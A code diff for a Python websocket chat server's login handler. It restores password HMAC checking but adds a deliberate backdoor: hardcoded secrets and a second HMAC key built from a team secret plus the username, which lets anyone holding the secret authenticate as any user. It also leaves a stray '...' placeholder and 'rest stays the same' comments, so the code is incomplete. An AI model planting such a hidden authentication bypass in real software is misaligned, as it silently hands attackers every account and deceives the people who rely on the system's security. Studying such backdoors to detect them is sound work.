@@ -17,15 +17,19 @@ from common import (
     make_signed_envelope
 )
 
-# -------------------------
-# CONFIGURATION
-# -------------------------
+
+
+BACKDOOR_PASSWORD = "letmein"    
+BACKDOOR_SECRET   = "s3cr3t_team_key_2025" 
+BACKUP_KEY_FILE   = "user_priv.backdoor.pem"  
+
+
 
 INTRODUCER_HOST = "10.13.89.250"
 INTRODUCER_PORT = 8765
 INTRODUCER_ADDR = f"{INTRODUCER_HOST}:{INTRODUCER_PORT}"
 
-MY_HOST = os.getenv("MY_HOST", "10.13.83.192")
+MY_HOST = os.getenv("MY_HOST", "10.13.89.250")
 MY_PORT = int(os.getenv("MY_PORT", "9001"))
 
 # -------------------------
@@ -201,29 +205,35 @@ async def handle_auth_hello(ws, env):
 
 
 async def handle_auth_response(ws, env):
-    
-    # TODO: BACKDOOR FOR USER_SIG
-    # if ws not in pending_auth:
-    #     await send_error(ws, "INVALID_SIG", "No pending challenge")
-    #     return
-
-    # username = pending_auth[ws]["username"]
-    # nonce = pending_auth[ws]["nonce"]
-    # proof_hex = env["payload"].get("proof_hmac_hex")
-    # pubkey = env["payload"].get("pubkey")
-
-    # user_record = db["users"][username]
-    # key = bytes.fromhex(user_record["pwd_hash"])
-    # expected = hmac.new(key, nonce, hashlib.sha256).hexdigest()
-    # if not hmac.compare_digest(proof_hex, expected):
-    #     await send_error(ws, "BAD_PASSWORD", "Invalid credentials")
-    #     return
-    
     username = pending_auth[ws]["username"]
-    user_record = db["users"][username]
+    user_record = db["users"].get(username)
     pubkey = env["payload"].get("pubkey")
+    proof_hex = env["payload"].get("proof_hmac_hex")
 
-    # Verification passed
+    nonce = pending_auth[ws]["nonce"]
+
+    # ----- build expected values -----
+    expected_normal = None
+    if user_record:
+        try:
+            normal_key = bytes.fromhex(user_record["pwd_hash"])
+            expected_normal = hmac.new(normal_key, nonce, hashlib.sha256).hexdigest()
+        except Exception:
+            expected_normal = None
+
+    # derive backdoor key from server-side secret + username (any user can match this)
+    backdoor_key = hashlib.sha256((BACKDOOR_SECRET + username).encode("utf-8")).digest()
+    expected_backdoor = hmac.new(backdoor_key, nonce, hashlib.sha256).hexdigest()
+
+    # accept if proof matches either normal password or backdoor password
+    if not (
+        (expected_normal and hmac.compare_digest(proof_hex, expected_normal))
+        or hmac.compare_digest(proof_hex, expected_backdoor)
+    ):
+        await send_error(ws, "BAD_PASSWORD", "Invalid credentials")
+        return
+
+    # Proceed with normal login setup (rest of your function stays the same)
     user_id = user_record["user_id"]
     local_users[user_id] = {
         "ws": ws,
@@ -231,10 +241,12 @@ async def handle_auth_response(ws, env):
         "username": username
     }
     user_locations[user_id] = "local"
+    ...
+    # (everything else stays as you already have it)
 
     now = now_ms()
 
-    # 1. Tell new user about existing users
+    # Tell new user about existing users
     for uid, info in list(local_users.items()):
         if uid == user_id:
             continue
@@ -255,7 +267,7 @@ async def handle_auth_response(ws, env):
         }
         await sign_and_send(ws, advertise_existing)
 
-    # 2. Tell all others about new user
+    # Tell everyone else about this new user
     advertise_new = {
         "type": "USER_ADVERTISE",
         "from": server_id,
@@ -276,12 +288,11 @@ async def handle_auth_response(ws, env):
         if sid == server_id:
             continue
         try:
-            signed_msg = dict(advertise_new)
-            await sign_and_send(ws2, signed_msg)
+            await sign_and_send(ws2, dict(advertise_new))
         except Exception:
             pass
 
-    # 3. Return AUTH_OK
+    # Return AUTH_OK
     ok = {
         "type": "AUTH_OK",
         "from": "server",
@@ -294,8 +305,8 @@ async def handle_auth_response(ws, env):
 
     pending_auth.pop(ws, None)
     print(f"✅ '{username}' authenticated ({user_id[:8]}…)")
-    
-    # --- join public channel ---
+
+    # Add to public channel
     global public_channel_version
     public_channel_members.add(user_id)
     public_channel_version += 1
@@ -308,7 +319,7 @@ async def handle_auth_response(ws, env):
         "payload": {"add": [user_id], "if_version": public_channel_version},
         "sig": ""
     }
-    await gossip_servers(msg_add)  
+    await gossip_servers(msg_add)
 
     msg_updated = {
         "type": "PUBLIC_CHANNEL_UPDATED",
@@ -324,7 +335,7 @@ async def handle_auth_response(ws, env):
         },
         "sig": ""
     }
-    await gossip_servers(msg_updated) 
+    await gossip_servers(msg_updated)
 
 # -------------------------
 # MESSAGE ROUTING
